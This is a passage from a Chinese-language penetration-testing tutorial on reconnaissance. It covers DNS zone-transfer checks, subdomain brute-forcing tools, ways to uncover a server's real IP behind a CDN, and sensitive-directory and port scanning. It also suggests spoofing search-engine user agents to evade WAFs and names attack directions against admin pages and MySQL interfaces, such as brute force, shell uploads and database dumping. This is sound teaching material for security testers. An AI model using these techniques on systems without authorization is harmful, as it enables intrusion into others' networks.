<p>当存在这种错误配置时,攻击者就可以获取整个域的所有记录,造成整个网络架构泄露。正确的配置包括</p>
<p>allow-transfer {ipaddress;}; 通过ip限制可进行域传送的服务器</p>
<p>allow-transfer { key transfer; }; 通过key限制可进行域传送的服务器</p>
<h3 id="34检测" class="headerLink">
    <a href="#34%e6%a3%80%e6%b5%8b" class="header-mark"></a>3.4、检测</h3><p>nmap脚本扫描</p>
<p>nmap –script dns-zone-transfer –script-args dns-zone-transfer.domain=targetdomain -p 53 -Pn dns.xxx</p>
<p>dig命令</p>
<p>dig @114.114.114.114 twosmi1e.com axfr @指定DNS服务器, 后面指定域名,axfr为域传送请求</p>
<p>nslookup</p>
<p>输入nslookup命令进入交互式shell界面;</p>
<p>server 命令参数设定查询将要使用的DNS服务器;针对某个域名可先输入域名获取dns信息。</p>
<p>ls命令列出某个域中的所有域名;如果太长不适合查看可定向保存至文件夹中。</p>
<p>exit命令退出</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png" title="image-20240318214733140" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-ddea2b5312329a51ed12f3c88fbdabc0c0c97f2d.png">
        
    </a></p>
<h2 id="4在线dns数据" class="headerLink">
    <a href="#4%e5%9c%a8%e7%ba%bfdns%e6%95%b0%e6%8d%ae" class="header-mark"></a>4、在线DNS数据</h2><p>有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。</p>
<h3 id="41virustotal" class="headerLink">
    <a href="#41virustotal" class="header-mark"></a>4.1、VirusTotal</h3><p><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener noreferrer">https://www.virustotal.com/#/home/search</a></p>
<h3 id="42dnsdumpster" class="headerLink">
    <a href="#42dnsdumpster" class="header-mark"></a>4.2、DNSdumpster</h3><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener noreferrer">https://dnsdumpster.com/</a></p>
<h3 id="42dnsdb" class="headerLink">
    <a href="#42dnsdb" class="header-mark"></a>4.2、dnsdb</h3><p><a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://www.dnsdb.io/zh-cn/</a></p>
<h2 id="5自身泄漏" class="headerLink">
    <a href="#5%e8%87%aa%e8%ba%ab%e6%b3%84%e6%bc%8f" class="header-mark"></a>5、自身泄漏</h2><p>robots.txt</p>
<p>crossdomain.xml(跨域策略文件cdx)</p>
<p>从流量中分析提取</p>
<h2 id="6github泄露" class="headerLink">
    <a href="#6github%e6%b3%84%e9%9c%b2" class="header-mark"></a>6、Github泄露</h2><h2 id="7google-hacking" class="headerLink">
    <a href="#7google-hacking" class="header-mark"></a>7、Google Hacking</h2><p>搜索引擎查询都会做一些反制爬虫的手段，目前使用google去采集的方法是调用google的官方API，或者调用bing的API去辅助采集。</p>
<h2 id="8在线子域名查询" class="headerLink">
    <a href="#8%e5%9c%a8%e7%ba%bf%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9f%a5%e8%af%a2" class="header-mark"></a>8、在线子域名查询</h2><p><a href="http://sbd.ximcx.cn/" target="_blank" rel="noopener noreferrer">http://sbd.ximcx.cn/</a></p>
<p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/subdomain/</a></p>
<h2 id="9子域名枚举爆破" class="headerLink">
    <a href="#9%e5%ad%90%e5%9f%9f%e5%90%8d%e6%9e%9a%e4%b8%be%e7%88%86%e7%a0%b4" class="header-mark"></a>9、子域名枚举爆破</h2><p>向DNS服务器(如8.8.8.8和8.8.4.4)请求字典里面的子域名，看返回的数据里面是否有记录，如果有则说明这是一个存在的子域名。比如说，向114.114.114.114定向请求<a href="https://forum.butian.net/share/www.qq.com" target="_blank" rel="noopener noreferrer">www.qq.com</a>的记录，返回了一条A记录指向182.254.34.74，就说明存在这个域名；相应的请求wooyun.qq.com并没有相应的记录返回，这就说明没有这个域名存在。</p>
<p>*<strong>注：一般只使用同一套主、副DNS，即8.8.8.8和8.8.4.4，DNS服务器不宜混搭，否则容易出现大量误报*</strong></p>
<p>发包可以用第三方库，比如说lijiejie的subDomainBrute使用了dnspython这个包。使用第三方包的确好，但是免不了一层封装和不能很好地理解DNS报文协议，也可能会降低一定的效率，和<strong>没有解决泛解析的好办法</strong>。</p>
<p><em><strong>泛解析这个问题的解决方法很简单，向DNS请求*记录，然后把枚举子域名回来的记录和*的记录比对，如果相同则直接排除\</strong></em>。但是实际上，如果使用第三方包，不自己造轮子的话，是无法实现这个的。因为有些域名的*记录是CNAME，而第三方包只能解析出IP却不会返回出CNAME给你。举个例子，以<a href="https://forum.butian.net/share/www.baidu.com" target="_blank" rel="noopener noreferrer">www.baidu.com</a>，大家ping一下都知道会跳转到<a href="https://forum.butian.net/share/www.a.shifen.com" target="_blank" rel="noopener noreferrer">www.a.shifen.com</a>，这就是一个CNAME记录，但是我们用第三方包只能获得最后解析出来的ip。</p>
<p>也就是说，<strong>如果一个域名他的泛解析是一个CNAME记录而且这又是一个CDN域名</strong>(恰巧这个又不少)，那么不是自己定制的dns查询函数，一般都会出现大量泛解析误报。这就有点像是灯下黑，知道了怎么做就可以了，却一直没有解决的办法。</p>
<p>如果要自己定制的话需要研究一下DNS报文协议，这里引用两张图片做简要分析</p>
<p>这是向DNS请求部分的：</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png" title="image-20240318215406584" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-3a54865a6b9d86c5d9a35ba4260e231a94f5d1af.png">
        
    </a></p>
<p>这是DNS服务器回传的报文：</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png" title="image-20240318215636520" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-7b3a549629a1d72960f6589a53e358481a97e2ea.png">
        
    </a></p>
<p>只需要按照这个协议的格式做正则提取即可获得我们想要的信息，A记录的是固定的正则，CNAME记录需要嵌套一层正则才能获取。</p>
<p>这里提供几个测试域名，都有CNAME记录作为泛解析的。</p>
<p>alitrip.com</p>
<p>taobao.com</p>
<p>tmall.com</p>
<p>52pk.com</p>
<p>focus.cn</p>
<h3 id="91oneforall" class="headerLink">
    <a href="#91oneforall" class="header-mark"></a>9.1、OneForAll</h3><p>下载地址：<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener noreferrer">https://github.com/shmilylty/OneForAll</a></p>
<p>目前支持一键收集：子域、子域常用端口、子域Title、子域状态、子域服务器等</p>
<p>020_信息收集_子域名OneForAll</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png" title="image-20240318220750492" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-d458cc2121cc80f9372c2aa98d85c293e99ba1c9.png">
        
    </a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png" title="image-20240318220755282" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-38fe8dfe06c49f4131b75270360e3d44f3788bfe.png">
        
    </a></p>
<h3 id="92subdomainbrute" class="headerLink">
    <a href="#92subdomainbrute" class="header-mark"></a>9.2、subDomainBrute</h3><p>工具地址： <a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener noreferrer">https://github.com/lijiejie/subDomainsBrute</a></p>
<p>高并发的DNS暴力枚举工具</p>
<p>020_信息收集_子域名subDomainsBrute</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png" title="image-20240318223332308" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-944cc4b5a7746ebe86c542130929900239d49ed3.png">
        
    </a></p>
<h3 id="93layer" class="headerLink">
    <a href="#93layer" class="header-mark"></a>9.3、Layer</h3><p>Layer子域名挖掘机是一款域名查询工具，可提供网站子域名查询服务；拥有简洁的界面、简单的操作模式，支持服务接口、暴力搜索、同服挖掘三种模式，支持打开网站、复制域名、复制IP、复制CDN、导出域名、导出IP、导出域名+IP、导出域名+IP+WEB服务器以及导出存活网站！</p>
<p>通过查看WEB服务器信息，筛选版本比较低的服务器（win2003+iis6.0），查看每个子域名是否开启常见的端口（3389、3306、21端口等），利用爆破工具进行枚举，会达到事半功倍的效果。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png" title="image-20240318223844214" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-b7f69762bfd198a51b4f205c45d69ea1682a42bf.png">
        
    </a></p>
<h3 id="94fuzsub" class="headerLink">
    <a href="#94fuzsub" class="header-mark"></a>9.4、FuzSub</h3><p><a href="https://github.com/DavexPro/FuzSub" target="_blank" rel="noopener noreferrer">https://github.com/DavexPro/FuzSub</a></p>
<h3 id="95fierce" class="headerLink">
    <a href="#95fierce" class="header-mark"></a>9.5、Fierce</h3><p><a href="https://github.com/davidpepper/fierce-domain-scanner" target="_blank" rel="noopener noreferrer">https://github.com/davidpepper/fierce-domain-scanner</a></p>
<h3 id="96御剑" class="headerLink">
    <a href="#96%e5%be%a1%e5%89%91" class="header-mark"></a>9.6、御剑</h3><h3 id="97wydomain" class="headerLink">
    <a href="#97wydomain" class="header-mark"></a>9.7、wydomain</h3><h3 id="98orangescan" class="headerLink">
    <a href="#98orangescan" class="header-mark"></a>9.8、orangescan</h3><h3 id="99dnsrecon" class="headerLink">
    <a href="#99dnsrecon" class="header-mark"></a>9.9、DNSRecon</h3><h3 id="910k8" class="headerLink">
    <a href="#910k8" class="header-mark"></a>9.10、K8</h3><h2 id="四ip信息收集" class="headerLink">
    <a href="#%e5%9b%9bip%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>四、IP信息收集</h2><p>首先，我们要判断该域名是否存在CDN的情况，我们可以去在线CDN查询网站：<strong><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a></strong> 。如果查询出的ip数量大于一个的话，则说明该ip地址不是真实的服务器地址。以我的经验来看，<strong>如果是2个或者3个，并且这几个地址是同一地区的不同运营商的话，则很有可能这几个地址是服务器的出口地址，该服务器在内网中，通过不同运营商NAT映射供互联网访问，同时采用几个不同的运营商可以负载均衡和热备份。如果是多个ip地址，并且这些ip地址分布在不同地区的话，则基本上可以断定就是采用了CDN了</strong>。</p>
<h2 id="1cdn概念" class="headerLink">
    <a href="#1cdn%e6%a6%82%e5%bf%b5" class="header-mark"></a>1、CDN概念</h2><p>内容分发网络(content delivery network或content distribution network,缩写作CDN)指一种通过互联网互相连接的电脑网络系统,利用最靠近每位用户的服务器,更快、更可靠地将音乐、图片、视频、应用程序及其他文件发送给用户,来提供高性能、可扩展性及低成本的网络内容传递给用户，<strong>主要就是通过多个不同节点加快网站的访问速度。</strong></p>
<h2 id="2判断是否真实ip" class="headerLink">
    <a href="#2%e5%88%a4%e6%96%ad%e6%98%af%e5%90%a6%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>2、判断是否真实IP</h2><h3 id="21nslookup" class="headerLink">
    <a href="#21nslookup" class="header-mark"></a>2.1、nslookup</h3><p><strong>命令端</strong></p>
<p>意义：用了CDN的会返回多个IP地址</p>
<p><strong>在线工具</strong></p>
<p><a href="http://tools.bugscaner.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tools.bugscaner.com/nslookup/</a></p>
<p><a href="http://tool.chinaz.com/nslookup/" target="_blank" rel="noopener noreferrer">http://tool.chinaz.com/nslookup/</a></p>
<h3 id="22多地ping" class="headerLink">
    <a href="#22%e5%a4%9a%e5%9c%b0ping" class="header-mark"></a>2.2、多地ping</h3><p>看IP是否一致，在线工具：</p>
<p><a href="http://ping.chinaz.com/" target="_blank" rel="noopener noreferrer">http://ping.chinaz.com/</a>、</p>
<p><a href="http://ping.aizhan.com/" target="_blank" rel="noopener noreferrer">http://ping.aizhan.com/</a>、</p>
<h3 id="23ip反查" class="headerLink">
    <a href="#23ip%e5%8f%8d%e6%9f%a5" class="header-mark"></a>2.3、IP反查</h3><p>反查IP有多个域名,那IP多半不是真实IP</p>
<h2 id="3绕cdn找真实ip" class="headerLink">
    <a href="#3%e7%bb%95cdn%e6%89%be%e7%9c%9f%e5%ae%9eip" class="header-mark"></a>3、绕CDN找真实IP</h2><h3 id="31子域名" class="headerLink">
    <a href="#31%e5%ad%90%e5%9f%9f%e5%90%8d" class="header-mark"></a>3.1、子域名</h3><p>CDN不便宜，所以很多站都是主站做了CDN，而很多小站没做CDN，所以可以通过上面收集到的子域名查询到真实的IP地址，进而知道网站真实IP的C段了。</p>
<h3 id="32历史dns解析记录" class="headerLink">
    <a href="#32%e5%8e%86%e5%8f%b2dns%e8%a7%a3%e6%9e%90%e8%ae%b0%e5%bd%95" class="header-mark"></a>3.2、历史DNS解析记录</h3><p>查询未使用CDN前的DNS服务器解析记录，查看IP与域名绑定的历史记录，可能会存在使用CDN前的记录</p>
<p><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener noreferrer">https://dnsdb.io/zh-cn/</a> DNS查询</p>
<p><a href="https://x.threatbook.cn/" target="_blank" rel="noopener noreferrer">https://x.threatbook.cn/</a> 微步在线</p>
<p><a href="http://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener noreferrer">http://toolbar.netcraft.com/site_report?url=</a> 在线域名信息查询</p>
<p><a href="http://viewdns.info/" target="_blank" rel="noopener noreferrer">http://viewdns.info/</a> DNS、IP等查询</p>
<p><a href="https://tools.ipip.net/cdn.php" target="_blank" rel="noopener noreferrer">https://tools.ipip.net/cdn.php</a> CDN查询IP</p>
<h3 id="33邮件服务器" class="headerLink">
    <a href="#33%e9%82%ae%e4%bb%b6%e6%9c%8d%e5%8a%a1%e5%99%a8" class="header-mark"></a>3.3、邮件服务器</h3><p>大部分网站会有注册,订阅,找回密码的功能会发送邮件,因为邮件系统一般都在内部，所以就可以通过邮箱获得真实的IP，邮件头信息中会有真实IP</p>
<h3 id="34信息泄漏" class="headerLink">
    <a href="#34%e4%bf%a1%e6%81%af%e6%b3%84%e6%bc%8f" class="header-mark"></a>3.4、信息泄漏</h3><p>有些网站会有phpinfo页面,一些debug模式不关等信息泄漏问题，上面会有真实IP</p>
<h3 id="35网络空间搜索引擎" class="headerLink">
    <a href="#35%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%bc%95%e6%93%8e" class="header-mark"></a>3.5、网络空间搜索引擎</h3><p>通过shadan、fofa等搜索引擎，通过对目标</p>
<p>网站的特征进行搜索，很多时候可以获取网站的真实IP</p>
<h3 id="36利用ssl证书查询" class="headerLink">
    <a href="#36%e5%88%a9%e7%94%a8ssl%e8%af%81%e4%b9%a6%e6%9f%a5%e8%af%a2" class="header-mark"></a>3.6、利用SSL证书查询</h3><p><a href="https://censys.io/certificates/" target="_blank" rel="noopener noreferrer">https://censys.io/certificates/</a></p>
<h3 id="37国外访问" class="headerLink">
    <a href="#37%e5%9b%bd%e5%a4%96%e8%ae%bf%e9%97%ae" class="header-mark"></a>3.7、国外访问</h3><p>一般的站点在国内可能会有CDN，但是在国外的用户覆盖率比较低，所以通过国外的节点进行请求往往能获取真实IP</p>
<h3 id="38ltm解码法" class="headerLink">
    <a href="#38ltm%e8%a7%a3%e7%a0%81%e6%b3%95" class="header-mark"></a>3.8、LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时,通过对set-cookie关键字的解码真实ip也可被获取,例如：Set-Cookie:</p>
<p>BIGipServerpool_8.29_8030=487098378.24095.0000,先把第一小节的十进制数即487098378取出来,然后将其转为十六进制数1d08880a,接着从后至前,以此取四位数出来,也就是0a.88.08.1d,最后依次把他们转为十进制数10.136.8.29,也就是最后的真实ip。</p>
<h2 id="五基本目录敏感目录及文件" class="headerLink">
    <a href="#%e4%ba%94%e5%9f%ba%e6%9c%ac%e7%9b%ae%e5%bd%95%e6%95%8f%e6%84%9f%e7%9b%ae%e5%bd%95%e5%8f%8a%e6%96%87%e4%bb%b6" class="header-mark"></a>五、基本目录、敏感目录及文件</h2><p>由于发布网站时，服务器配置问题，导致目录浏览功能打开，从而引起信息泄露，造成安全隐患。在信息收集过程中，需要收集的敏感目录/文件信息包括：</p>
<p>1.robots.txt</p>
<p>2.crossdomin.xml</p>
<p>3.sitemap.xml</p>
<p>4.后台目录</p>
<p>5.网站安装包</p>
<p>6.网站上传目录</p>
<p>7.mysql管理页面</p>
<p>8.phpinfo</p>
<p>9.网站文本编辑器</p>
<p>10.测试文件</p>
<p>11.网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</p>
<p>12.DS_Store 文件</p>
<p>13.vim编辑器备份文件(.swp)</p>
<p>14.WEB—INF/web.xml文件</p>
<p>目录扫描对应信息收集来说特为重要，比如robots文件当中就可能泄露网站的后台或者CMS信息等，安装包中便泄露了网站的源码，phpinfo泄露了服务器的一些配置信息，编辑器、上传页面便可以进行利用相关的漏洞进行渗透，mysql、后台管理页面可以进行枚举爆破来尝试登陆进行下一步的安全测试。</p>
<p>扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</p>
<p>后台目录：弱口令，万能密码，爆破</p>
<p>安装包：获取数据库信息，甚至是网站源码</p>
<p>上传目录：截断、上传图片马等</p>
<p>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</p>
<p>安装页面 ：可以二次安装进而绕过</p>
<p>phpinfo：会把你配置的各种信息暴露出来</p>
<p>编辑器：fck、ke、等</p>
<p>iis短文件利用：条件比较苛刻 windows、apache等</p>
<p>robots.txt 文件是专门针对搜索引擎机器人robot 编写的一个纯文本文件。我们可以在这个文件中指定网站中不想被robot访问的目录。这样，我们网站的部分或全部内容就可以不被搜索引擎收录了，或者让搜索引擎只收录指定的内容。因此我们可</p>
<p>以利用robots.txt让Google的机器人访问不了我们网站上的重要文件，GoogleHack的威胁也就不存在了。</p>
<p>假如编写的robots.txt文件内容如下：</p>
<p>User-agent: *</p>
<p>Disallow: /data/</p>
<p>Disallow: /db/</p>
<p>Disallow: /admin/</p>
<p>Disallow: /manager/</p>
<p>Allow:/images/</p>
<p>其中“Disallow”参数后面的是禁止robot收录部分的路径，例如我们要让robot禁止收录网站目录下的“data”文件夹，只需要在Disallow参数后面加上 /data/ 即可。如果想增加其他目录，只需按此格式继续添加。文件编写完成后将其上传到网站的根目录，就可以让网站远离Google Hack了。</p>
<p>虽然robots文件目的是让搜索蜘蛛不爬取想要保护的页面，但是如果我们知道了robots文件的内容的话，我们就可以知道目标网站哪些文件夹不让访问，从侧面说明这些文件夹是很重要的了。</p>
<h2 id="1dirsearch" class="headerLink">
    <a href="#1dirsearch" class="header-mark"></a>1、dirsearch</h2><p>工具地址：<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">https://github.com/maurosoria/dirsearch</a></p>
<p>002_目录信息_dirsearch</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png" title="image-20240318223946570" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-cd2731804d040fd44ab39c011b263b8128b2a908.png">
        
    </a></p>
<h2 id="2dirbuster" class="headerLink">
    <a href="#2dirbuster" class="header-mark"></a>2、dirbuster</h2><p>工具地址：<a href="https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%20%28jar%20%2B%20lists%29%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist" target="_blank" rel="noopener noreferrer">https://downloads.sourceforge.net/project/dirbuster/DirBuster%20%28jar%20%2B%20lists%29/1.0-RC1/DirBuster-1.0-RC1.zip?r=https%3A%2F%2Fsourceforge.net%2Fprojects%2Fdirbuster%2Ffiles%2FDirBuster%2520%2528jar%2520%252B%2520lists%2529%2F1.0-RC1%2F&amp;ts=1491212671&amp;use_mirror=jaist</a></p>
<p>当使用扫描工具对站点进行扫描，网站存在WAF后，会给我们的工具进行拦截，这时候我们需要修改User Agent值来绕过WAF的拦截，而DirBuster这款扫描工具便可以修改User Agent值</p>
<p>Mozilla/5.0 (compatible; Baiduspider/2.0; <a href="http://www.baidu.com/search/spider.html" target="_blank" rel="noopener noreferrer">http://www.baidu.com/search/spider.html</a>) 百度蜘蛛抓取欺骗</p>
<p>Mozilla/5.0 (compatible; Googlebot/2.1; <a href="http://www.google.com/bot.html" target="_blank" rel="noopener noreferrer">http://www.google.com/bot.html</a>) 谷歌蜘蛛抓取欺骗</p>
<p>Firefox 3.6 Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.2.8;baidu Transcoder) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) 百度转码浏览欺骗</p>
<p>Chrome Mozilla/5.0 (en-us) AppleWebKit/534.14 (KHTML, like Gecko; Google Wireless Transcoder) Chrome/9.0.597 Safari/534.14 谷歌转码浏览欺骗</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-dff5d1680324323642d895b1451522b43dd28b1c.png" title="image-20240318224002259" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-dff5d1680324323642d895b1451522b43dd28b1c.png">
        
    </a></p>
<h2 id="37kbscan" class="headerLink">
    <a href="#37kbscan" class="header-mark"></a>3、7kbscan</h2><p>工具：<a href="https://github.com/7kbstorm/7kbscan-WebPathBrute" target="_blank" rel="noopener noreferrer">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png" title="image-20240318224015520" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-9a03d3e6d87ddc4be1a249d43fdc24c1071e38b8.png">
        
    </a></p>
<h2 id="4webrobot" class="headerLink">
    <a href="#4webrobot" class="header-mark"></a>4、Webrobot</h2><h2 id="5御剑" class="headerLink">
    <a href="#5%e5%be%a1%e5%89%91" class="header-mark"></a>5、御剑</h2><h2 id="6爬虫-中国菜刀" class="headerLink">
    <a href="#6%e7%88%ac%e8%99%ab-%e4%b8%ad%e5%9b%bd%e8%8f%9c%e5%88%80" class="header-mark"></a>6、爬虫-中国菜刀</h2><h2 id="7wwwscan" class="headerLink">
    <a href="#7wwwscan" class="header-mark"></a>7、wwwscan</h2><h2 id="8cansina" class="headerLink">
    <a href="#8cansina" class="header-mark"></a>8、cansina</h2><h2 id="9dirmap" class="headerLink">
    <a href="#9dirmap" class="header-mark"></a>9、dirmap</h2><h2 id="10webdirscan" class="headerLink">
    <a href="#10webdirscan" class="header-mark"></a>10、Webdirscan</h2><h2 id="11bbscan" class="headerLink">
    <a href="#11bbscan" class="header-mark"></a>11、BBscan</h2><h2 id="12gsil" class="headerLink">
    <a href="#12gsil" class="header-mark"></a>12、GSIL</h2><h2 id="六端口扫描" class="headerLink">
    <a href="#%e5%85%ad%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f" class="header-mark"></a>六、端口扫描</h2><p>通过端口扫描可以判断出网站开启的服务，从而通过爆破枚举或者漏洞利用进行突破，进一步提升网站权限，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。</p>
<p>扫描到的端口也许是网站的一个旁站，可以尝试对旁站进行漏洞探测，但是有些服务开启的端口可能被管理员修改，通过手工判断分析即可（例如开启了8888端口，通过尝试远程桌面连接确定该端口为3389修改过的端口）。</p>
<h2 id="windows下的命令" class="headerLink">
    <a href="#windows%e4%b8%8b%e7%9a%84%e5%91%bd%e4%bb%a4" class="header-mark"></a>windows下的命令</h2><p>显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，</p>
<p>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等 ：netstat -a</p>
<p>以数字形式显示地址和端口号,显示所有已建立的有效连接：netstat -n</p>
<p>列出所有端口的情况：netstat -ano</p>
<p>查看被占用端口80对应的应用的PID：netstat -ano|findstr &ldquo;80&rdquo;</p>
<p>查看80端口被哪个进程或程序占用：tasklist|findstr &ldquo;80&rdquo;</p>
<p>结束该进程或程序：taskkill /f /t /im XX.exe</p>
<h2 id="1各服务开启的默认端口以及攻击方向" class="headerLink">
    <a href="#1%e5%90%84%e6%9c%8d%e5%8a%a1%e5%bc%80%e5%90%af%e7%9a%84%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bb%a5%e5%8f%8a%e6%94%bb%e5%87%bb%e6%96%b9%e5%90%91" class="header-mark"></a>1、各服务开启的默认端口以及攻击方向</h2><p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png" title="image-20240318224051389" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-829b2e7c91f90ba980f831fbc8c4671a5a199976.png">
        
    </a></p>
<h2 id="2在线查询网站" class="headerLink">
    <a href="#2%e5%9c%a8%e7%ba%bf%e6%9f%a5%e8%af%a2%e7%bd%91%e7%ab%99" class="header-mark"></a>2、在线查询网站</h2><p><a href="http://coolaf.com/tool/port" target="_blank" rel="noopener noreferrer">http://coolaf.com/tool/port</a></p>
<p><a href="https://tool.lu/portscan/index.html" target="_blank" rel="noopener noreferrer">https://tool.lu/portscan/index.html</a></p>
<h2 id="3端口扫描工具" class="headerLink">
    <a href="#3%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e5%b7%a5%e5%85%b7" class="header-mark"></a>3、端口扫描工具</h2><p>端口扫描工具常见有nmap和masscan。nmap扫描的准确性较高，但是扫描的比较慢。masscan扫描的比较快，但是准确性较低，如果网站存在WAF可以通过调节扫描线程或者利用FTP连接工具、SSH连接工具、Mysql连接等工具进行手工探测</p>
<h3 id="31nmapzmap" class="headerLink">
    <a href="#31nmapzmap" class="header-mark"></a>3.1、nmap(zmap)</h3><p>Nmap扫描中一些常见的服务</p>
<p>msmq? ：默认对于的是1801端口，是 MSMQ Microsoft Message Queuing微软消息队列的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。</p>
<p><a class="lightgallery" href="https://www.bysec.cn/OSS/img/%e4%b8%87%e5%ad%97%e6%80%bb%e7%bb%93%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86%e5%85%a8%e7%bd%91%e6%9c%80%e5%85%a8/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png" title="image-20240318224248649" data-thumbnail="https://www.bysec.cn/OSS/img/万字总结信息收集全网最全/attach-24463e1ce4118de12e61728339bfbd6a2f12c9b7.png">
        
    </a></p>
